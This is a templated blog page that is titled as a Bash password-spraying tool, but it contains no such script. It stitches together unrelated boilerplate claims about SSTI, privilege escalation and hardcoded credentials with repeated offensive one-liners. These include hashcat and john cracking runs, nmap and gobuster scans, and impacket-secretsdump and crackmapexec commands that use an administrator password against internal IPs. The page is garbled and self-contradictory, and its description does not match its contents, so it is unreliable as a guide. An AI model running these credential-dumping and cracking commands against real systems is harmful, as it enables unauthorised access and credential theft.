---
TitleSEO: "Password Spraying Tool in Bash | ZureFX"
TitlePost: "Password Spraying Tool — Bash"
Author: "ZureFX"
Description: "A Bash script for password spraying tool. Built for security research and automation."
Keywords: "scanner, rust, automation, powershell, bash"
URL: "https://zurefx.github.io/scripting/script-password-spraying-tool-730.html"
URL_IMAGES: ""
Date: "2025-03-18"
Tags: "Scanner, Rust, Automation, PowerShell, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-password-spraying-tool-730"
Permalink: "/scripting/script-password-spraying-tool-730.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The web application was vulnerable to Server-Side Template Injection (SSTI). Post-exploitation enumeration revealed a path to domain administrator privileges. The service account had excessive permissions assigned in Active Directory.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `enum4linux`
- `pwncat`
- `john`

## Implementation

### Core Logic

The service was running without proper input validation, leading to injection vulnerabilities. Command injection was possible through unsanitized user input in the search functionality.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p3389,8080,3268 10.62.79.32 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The kernel version was outdated and vulnerable to a publicly known exploit. The database credentials were hardcoded in the application source code.

### Helper Functions

The application stored sensitive credentials in an unencrypted configuration file. The database credentials were hardcoded in the application source code.

```bash
gobuster dir -u http://10.107.68.35/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Usage

### Basic Usage

Weak file permissions allowed modification of critical system files. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.109.50.34/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p8888,22,5986 10.75.72.37 -oN scan.txt
```

### Advanced Options

Weak file permissions allowed modification of critical system files. The service was running without proper input validation, leading to injection vulnerabilities. The target system was identified as running a vulnerable version of the service.

```bash
gobuster dir -u http://10.113.78.22/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.46.21.139
crackmapexec smb 10.125.196.134 -u administrator -p 'P@ssw0rd!' --shares
```

## Output

### Example Output

The application stored sensitive credentials in an unencrypted configuration file. Unconstrained delegation was enabled on the compromised machine.

```
[+] Scanning target...
[+] Found 4 results
[+] Done in 3.00s
```
